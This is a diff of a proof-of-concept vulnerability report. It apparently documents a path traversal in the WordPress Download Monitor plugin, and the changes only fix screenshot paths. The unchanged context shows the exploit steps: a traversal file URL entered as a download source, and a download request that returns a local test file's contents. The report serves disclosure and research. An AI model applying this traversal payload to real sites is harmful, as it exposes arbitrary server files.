@@ -126,7 +126,7 @@ echo test_content_for_validation > D:\test.txt
 WordPress Admin > Download Monitor > Downloads > Add New
 ```
 
-![test12](.\screenshots\test12.png)
+![test12](./screenshots/test12.png)
 
 **Step 3:** In the "Downloadable Files" section, enter the following malicious URL:
 
@@ -134,9 +134,9 @@ WordPress Admin > Download Monitor > Downloads > Add New
 D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../test.txt
 ```
 
-![test11](C:\Users\zyj\Desktop\test\test3\test11.png)
+![test11](./screenshots/test11.png)
 
-![test15](C:\Users\zyj\Desktop\test\test3\test15.png)
+![test15](./screenshots/test15.png)
 
 **Step 4:** Publish/Save the download entry.
 
@@ -146,9 +146,9 @@ D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../test.txt
 GET http://target-site.com/download/123/?tmstv=1783045540
 ```
 
-![test13](C:\Users\zyj\Desktop\test\test3\test13.png)
+![test13](./screenshots/test13.png)
 
-![test16](C:\Users\zyj\Desktop\test\test3\test16.png)
+![test16](./screenshots/test16.png)
 
 **Step 6:** The server responds with the contents of `D:\test.txt`:
 
@@ -156,7 +156,7 @@ GET http://target-site.com/download/123/?tmstv=1783045540
 test_content_for_validation
 ```
 
-![test14](C:\Users\zyj\Desktop\test\test3\test14.png)
+![test14](./screenshots/test14.png)
 
 #### 5.4 Alternative Exploitation via Database (for CI/automation)
 
